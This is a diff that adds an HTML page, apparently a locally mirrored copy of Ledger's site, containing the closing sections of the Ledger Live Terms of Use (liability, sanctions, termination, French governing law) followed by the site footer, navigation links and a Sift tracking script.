+<p><span style="font-weight: 400;"><strong>8.1 No warranty.</strong> Ledger will use reasonable level of skill and care to ensure that the Services can be accessed by you in accordance with the present Terms of Use, but there are no guarantees that access and features will not be interrupted or that there will be no delays, failures, errors, omissions, corruption or loss of transmitted information. The Services are provided “as is” without any warranty of any kind, either express or implied, and in particular without implied warranties of merchantability, reliability, and fitness for a particular purpose. </span></p>
+<p><span style="font-weight: 400;"><strong>8.2 Limitation of Liability.</strong> YOU EXPRESSLY UNDERSTAND AND AGREE THAT LEDGER AND ITS DIRECTORS AND EMPLOYEES SHALL NOT BE LIABLE TO YOU FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, CONSEQUENTIAL OR EXEMPLARY DAMAGES, INCLUDING, BUT NOT LIMITED TO, DAMAGES FOR LOSS OF PROFITS, GOODWILL, USE, DATA, COST OF PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES, OR OTHER INTANGIBLE LOSSES, RESULTING FROM: (I) THE USE OR INABILITY TO USE THE SERVICES (II) ANY CHANGES MADE TO THE SERVICES OR ANY SUSPENSION OR CESSATION OF THE SERVICES OR ANY PART THEREOF; (III) THE UNAUTHORIZED ACCESS TO OR ALTERATION OF YOUR TRANSMISSIONS OR DATA; (IV) THE DELETION OF, CORRUPTION OF, OR FAILURE TO STORE AND/OR SEND OR RECEIVE YOUR TRANSMISSIONS OR DATA ON OR THROUGH THE SERVICES; AND (V) ANY OTHER MATTER RELATING TO THE SERVICES. SAVE FOR THIRD PARTY SERVICES WHICH ARE NOT OPERATED OR PROVIDED BY LEDGER, THE ABOVE LIMITATIONS DO NOT APPLY IN RESPECT OF LOSS RESULTING FROM (A) LEDGER’S FRAUD, WILFUL MISCONDUCT OR GROSS NEGLIGENCE, WILFUL MISCONDUCT OR FRAUD; OR (B) DEATH OR PERSONAL INJURY.</span></p>
+<h2></h2>
+<h2></h2>
+<h2></h2>
+<h2>9. Compliance and Export Control</h2>
+<p><span style="font-weight: 400;"><strong>9.1 Sanctions.</strong> Users shall comply, at their own expense, with all laws that apply to or result from their obligations under these Terms. By accessing and using the Services, you represent and warrant that you are not on any trade or economic sanctions lists, such as (but not limited to) the UN Security Council Sanctions list, designated as a “Specially Designated National” by OFAC (Office of Foreign Assets Control of the U.S. Treasury Department) or placed on the U.S. Commerce Department’s “Denied Persons List”. </span></p>
+<p><strong>9.2 Territories.</strong> Ledger reserves the right to select the markets and jurisdictions where it operates and may restrict or deny access to Services in certain countries, states or territories.</p>
+<h2>10. Termination - Suspension</h2>
+<p><span style="font-weight: 400;"><strong>10.1 Termination rights.</strong> You may stop using the Services at any time. We reserve the right to suspend or terminate your access to the Services without notice if we believe you violated these Terms.</span></p>
+<p><strong>10.2 Access to your Wallets upon termination.</strong> Ledger does not control access to your Wallets. Please make sure that to securely back up your Private Keys and your Wallet address at all times to ensure access to your Crypto Assets after termination.</p>
+<h2>11. Governing law and jurisdiction</h2>
+<p><span style="font-weight: 400;"><strong>11.1 Governing Law.</strong> These Terms will be governed by and interpreted in accordance with the laws of France.</span></p>
+<p><span style="font-weight: 400;"><strong>11.2. Out-of-court settlement.</strong> For Users residing in a member state of the European Union, in the event the claim would not be solved through our customer support or would remain without response within more than two (2) months after its reception by our customer support, the User may choose to submit the dispute to an out-of-court settlement procedure through the European platform for alternative and online dispute resolution <a href="https://webgate.ec.europa.eu/odr/" target="_blank" rel="noopener noreferrer">here</a>.<br></span></p>
+<p><strong>11.3 Jurisdiction. </strong>Any dispute, controversy, difference or claim arising out of or relating to this Agreement, including the existence, validity, interpretation, performance, breach or termination thereof or any dispute regarding non-contractual obligations arising out of or relating to it shall be referred to and finally resolved by the competent courts of Paris, France.</p>
+<h2>12. General</h2>
+<p><span style="font-weight: 400;"><strong>12.1 Entire Agreement.</strong> These Terms constitute the entire and exclusive understanding and agreement between Ledger and you regarding Ledger Live, and supersede and replace any and all prior oral or written understandings or agreements between Ledger and you regarding Ledger Live. If you do not read and accept the Terms in their entirety you should not use or continue using Ledger Services.</span></p>
+<p><strong>12.2 Changes to the Terms. </strong>We reserve the right to alter, amend or modify these Terms from time to time, in our sole discretion, due to legislative or regulatory measures, technical developments, any change or improvement of the Services including security reinforcement of the Services. We will provide you with notice of such changes <span style="font-weight: 400;">through</span> Ledger Live <span style="font-weight: 400;">and such changes shall apply immediately upon your acceptance or within one (1) month upon notice of changes at the latest. In any case, if you do not accept the changes, you must cease to use the Services.</span></p>
+<p><b>12.3 Assignment.</b> You may not assign your rights or obligations under these Terms in whole or in part to any third party. You acknowledge and agree that Ledger may assign its rights and obligations under these Terms of Use and, in such context, share or transfer information provided by you while using the Services to a third party.</p>
+<p><strong>12.4 Severability.</strong> Should any provision of these Terms or part thereof to any extent be or become invalid or unenforceable, such provision shall then be deemed separable from the remaining provisions of these Terms and shall not affect or impair the validity or enforceability of the remaining provisions of these Terms.</p>
+</div>
+
+
+</div>
+
+  
+  <!--Back in stock Js-->
+  <script src="js/global-back-in-stock.js" type="text/javascript"></script>
+</main>
+
+
+
+
+
+
+
+
+  <div id="shopify-section-footer" class="shopify-section">
+ 
+
+
+
+
+
+
+  <div class="bg bg-secondary prefooter-blocks">
+    <div class="row">
+      <div class="row flexbox">
+        <div>
+          <h3 class="h5 margin-xxs">Stay in touch</h3>
+          <p>Announcements can be found in our blog. Press contact:<br class="is-hidden-mobile"> <a href="mailto:media@ledger.com" title="">media@ledger.com</a></p>
+
+          <ul class="no-bullet social-icons">
+                  <li><a href="https://github.com/LedgerHQ" title="Ledger Github" target="_blank"><i class="fab fa-github"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.facebook.com/Ledger/" title="Ledger Facebook" target="_blank"><i class="fab fa-facebook"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.instagram.com/ledger/" title="Ledger Instagram" target="_blank"><i class="fab fa-instagram"></i></a></li>
+                
+              
+            
+                  <li><a href="https://twitter.com/Ledger" title="Ledger Twitter" target="_blank"><i class="fab fa-twitter"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.youtube.com/Ledger" title="Youtube" target="_blank"><i class="fab fa-youtube"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.linkedin.com/company/ledgerhq" title="Ledger Linkedin" target="_blank"><i class="fab fa-linkedin"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.tiktok.com/@ledger" title="TikTok" target="_blank"><i class="fab fa-tiktok"></i></a></li>
+                
+              
+            
+            <!--<li><a href="#" title="Ledger Reddit"><i class="fab fa-reddit"></i></a></li>
+            <li><a href="#" title="Ledger Facebook"><i class="fab fa-facebook"></i></a></li>
+            <li><a href="#" title="Ledger Twitter"><i class="fab fa-twitter"></i></a></li>
+            <li><a href="#" title="Ledger Youtube"><i class="fab fa-youtube"></i></a></li>
+            <li><a href="#" title="Ledger Linkedin company"><i class="fab fa-linkedin"></i></a></li>
+            <li><a href="#" title="Ledger Tiktok"><i class="fab fa-tiktok"></i></a></li>-->
+          </ul>
+        </div>
+
+        
+
+      </div>
+    </div>
+  </div>
+
+<footer id="footer" class="footer   ">
+	<div class="row flexbox">
+    <div>
+      <a href="index.html" title="Ledger" class="logo"
+        ><img
+          src="images/ledger-logo-long.svg"
+          alt="Ledger"
+      /></a>
+      <ul class="language-container">
+        <li class="has-children language-switcher">
+          <a href="#" title="ENGLISH">ENGLISH</a>
+          <ul class="submenu">
+            <li>
+              <a
+                class="localeItem"
+                lang="ar"
+                href="ar/"
+                title="العربية"
+                >العربية</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="de"
+                href="de/"
+                title="DEUTSCH"
+                >DEUTSCH</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="es"
+                href="es/"
+                title="ESPAÑOL"
+                >ESPAÑOL</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="fr"
+                href="fr/"
+                title="FRANÇAIS"
+                >FRANÇAIS</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="ja"
+                href="ja/"
+                title="日本語"
+                >日本語</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="ko"
+                href="ko/"
+                title="한국어"
+                >한국어</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="pt-BR"
+                href="pt-BR/"
+                title="PORTUGUÊS (BRASIL)"
+                >PORTUGUÊS</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="ru"
+                href="ru/"
+                title="РУССКИЙ"
+                >РУССКИЙ</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="tr"
+                href="tr/"
+                title="TÜRKÇE"
+                >TÜRKÇE</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="zh-CN"
+                href="zh-CN/"
+                title="简体中文"
+                >简体中文</a
+              >
+            </li>
+          </ul>
+        </li>
+      </ul>
+      <div class="caption">
+        <p>
+          Copyright © Ledger SAS. All rights reserved. Ledger, Ledger
+          Stax, Ledger Nano S, Ledger Vault, Bolos are registered
+          trademarks of Ledger SAS<br /><br />
+          1 rue du mail, 75002, Paris, France<br /><br />
+          Payment methods
+        </p>
+        <img src="images/logo-paypal-s.png" alt="">&nbsp;
+        <img src="images/logo-crypto-s.png" alt="">&nbsp;
+        <img src="images/logo-bitpay-s.png" alt="">&nbsp;
+        <br>
+        <img src="images/layer1.png" alt="">&nbsp;
+        <img src="images/logo-visa-s.png" alt="">&nbsp;
+        <img src="images/logo-maestro-s.png" alt="">&nbsp;
+        <img src="images/logo-mastercard-s.png" alt="">&nbsp;
+        <img src="images/logo-cb-s.png" alt="">
+      </div>
+    </div>
+		
+		
+	
+		
+    <nav class="flexbox footer-navigation">
+      <div>
+        <ul>
+          <li>Products<ul id="menu-footer-1-products" class="menu">
+              <!-- <li id="menu-item-255315"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-255315"><a
+                  href="ledger-stax.html">Ledger Stax</a></li> -->
+              <li id="menu-item-4481" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4481">
+                <a href="ledger-nano-x.html">Ledger Nano X</a>
+              </li>
+              <li id="menu-item-91454"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-91454"><a
+                  href="ledger-nano-s-plus.html">Ledger Nano S Plus</a></li>
+              <li id="menu-item-11736"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11736"><a
+                  href="hardware-wallets-comparison.html">Compare our devices</a></li>
+              <!-- <li id="menu-item-12666"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12666"><a
+                  href="shop.html#category-bundle">Bundles</a></li>
+              <li id="menu-item-4484" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4484">
+                <a href="shop.html#category-accessories">Accessories</a>
+              </li> -->
+              <!-- <li id="menu-item-4483" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4483">
+                <a href="shop.html">All products</a>
+              </li> -->
+              <li id="menu-item-4485" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4485">
+                <a href="ledger-live.html">Downloads</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>Crypto Assets<ul id="menu-footer-6-crypto-assets" class="menu">
+              <li id="menu-item-9935" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9935">
+                <a href="https://www.ledger.com/bitcoin-wallet/">Bitcoin</a>
+              </li>
+              <li id="menu-item-4497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4497">
+                <a href="https://www.ledger.com/ripple-wallet/">XRP</a>
+              </li>
+              <li id="menu-item-4498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4498">
+                <a href="https://www.ledger.com/ethereum-wallet/">Ethereum</a>
+              </li>
+              <li id="menu-item-4499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4499">
+                <a href="https://www.ledger.com/bitcoin-cash-wallet/">Bitcoin Cash</a>
+              </li>
+              <li id="menu-item-9017" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9017">
+                <a href="https://www.ledger.com/eos-wallet/">Eos</a>
+              </li>
+              <li id="menu-item-9936" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9936">
+                <a href="https://www.ledger.com/stellar-wallet/">Stellar</a>
+              </li>
+              <li id="menu-item-4496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4496">
+                <a href="supported-crypto-assets.html">See all assets</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+
+      </div>
+      <div>
+        <ul>
+          <li>For Business<ul id="menu-footer-2-for-business" class="menu">
+              <li id="menu-item-4490" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4490">
+                <a href="https://enterprise.ledger.com/">Ledger Enterprise Solutions</a>
+              </li>
+              <li id="menu-item-4490"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4490-a">
+                <a href="https://www.ledger.com/reseller">Official Resellers</a>
+              </li>
+              <li id="menu-item-4490"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4490-b">
+                <a href="https://www.ledger.com/partners">Partners</a>
+              </li>
+              <li id="menu-item-4490"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4490-a">
+                <a href="https://www.ledger.com/co-branded-partnership">Co-branded Partnerships</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+        <!-- <ul>
+          <li>For Developers<ul id="menu-footer-8-for-developers" class="menu">
+              <li id="menu-item-79929"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-79929"><a
+                  href="developers.html">The Developer Portal</a></li>
+            </ul>
+          </li>
+        </ul> -->
+        <ul>
+          <li>Get started<ul id="menu-footer-3-get-started" class="menu">
+              <li id="menu-item-10242"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-10242"><a
+                  href="https://www.ledger.com/start">Start using your Ledger device</a></li>
+              <li id="menu-item-11525"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11525"><a
+                  href="https://www.ledger.com/ledger-wallets-and-services">Compatible wallets and services</a></li>
+              <li id="menu-item-11520"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11520"><a
+                  href="buy-bitcoin.html">How to buy Bitcoin</a></li>
+              <li id="menu-item-15515"
+                class="menu-item menu-item-type-post_type menu-item-object-post menu-item-15515"><a
+                  href="https://www.ledger.com/buy-bitcoin/how">Guide before buying bitcoin</a></li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>See also<ul id="menu-footer-4-see-also" class="menu">
+              <li id="menu-item-4505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4505">
+                <a href="support.html">Support</a>
+              </li>
+              <li id="menu-item-4507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4507">
+                <a href="https://donjon.ledger.com/bounty/">Bounty program</a>
+              </li>
+              <!-- <li id="menu-item-9937" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9937">
+                <a href="reseller.html">Resellers</a></li> -->
+              <li id="menu-item-79931"
+                class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79931"><a
+                  href="https://www.ledger.com/press">Ledger Press Kit</a></li>
+              <li id="menu-item-9938" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9938">
+                <a href="https://affiliate.ledger.com/">Affiliates</a>
+              </li>
+              <li id="menu-item-9939" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9939">
+                <a href="https://status.ledger.com/">Status</a>
+              </li>
+              <li id="menu-item-14258"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-14258"><a
+                  href="https://www.ledger.com/partners">Partners</a></li>
+            </ul>
+          </li>
+        </ul>
+
+      </div>
+      <div>
+        <ul>
+          <li>Careers<ul id="menu-footer-9-careers" class="menu">
+              <li id="menu-item-211290"
+                class="menu-item menu-item-type-post_type menu-item-object-page menu-item-211290"><a
+                  href="https://www.ledger.com/career">Join us</a></li>
+              <li id="menu-item-79930"
+                class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79930"><a
+                  href="https://www.ledger.com/jobs">All jobs</a></li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>About<ul id="menu-footer-5-about" class="menu">
+              <li id="menu-item-12382"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12382"><a
+                  href="https://www.ledger.com/blog/we-are-ledger-a-brand-vision">Our vision</a></li>
+              <li id="menu-item-11491"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11491"><a
+                  href="https://www.ledger.com/academy">Ledger Academy</a></li>
+              <li id="menu-item-4501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4501">
+                <a href="https://www.ledger.com/the-company">The company</a>
+              </li>
+              <li id="menu-item-4502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4502">
+                <a href="https://www.ledger.com/the-people-behind-ledger">The people</a>
+              </li>
+              <li id="menu-item-13241"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13241"><a
+                  href="https://www.ledger.com/diversity">Diversity</a></li>
+              <li id="menu-item-79928"
+                class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79928"><a
+                  href="https://www.ledger.com/in-the-news">In the news</a></li>
+              <li id="menu-item-10246"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-10246"><a href="blogs.html">Our
+                  blogs</a></li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>Legal<ul id="menu-footer-7-legal" class="menu">
+              <li id="menu-item-4509" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4509">
+                <a href="terms-and-conditions.html">Sales Terms and Conditions</a>
+              </li>
+              <li id="menu-item-4510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4510">
+                <a href="website-terms-of-use.html">Website Terms of Use</a>
+              </li>
+              <li id="menu-item-12908"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12908"><a
+                  href="ledger-live-terms-of-use.html">Ledger Live Terms of Use</a></li>
+              <li id="menu-item-4511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4511">
+                <a href="https://www.ledger.com/privacy-policy">Privacy Policy</a>
+              </li>
+              <li id="menu-item-4512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4512">
+                <a href="cookie-policy.html">Cookie Policy</a>
+              </li>
+              <li id="menu-item-4513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4513">
+                <a href="other.html">Other</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+
+      </div>
+    </nav>
+		    
+	</div>
+</footer>
+
+
+</div>
+  <script>
+    var devSift = '116107f359';
+    var prodSift = 'a2301bbaac';
+    var siftKey = window.theme.shop.domain === 'ledgerstore-dev.myshopify.com' ? devSift : prodSift;
+    var _sift = window._sift = window._sift || [];
+
+    _sift.push(['_setAccount', siftKey]);
+    _sift.push(['_trackPageview']);
+
+    var _user_id ='' ;
+    
+    _sift.push(['_setUserId', _user_id]);
+
+    (function() {
+    function ls() {
+    var e = document.createElement('script');
+    e.src = 'https://cdn.siftscience.com/s.js';
+    document.body.appendChild(e);
+    }
+    if (window.attachEvent) {
+    window.attachEvent('onload', ls);
+    } else {
+    window.addEventListener('load', ls, false);
+    }
+    })();
+</script>
+</body>
+
+</html>
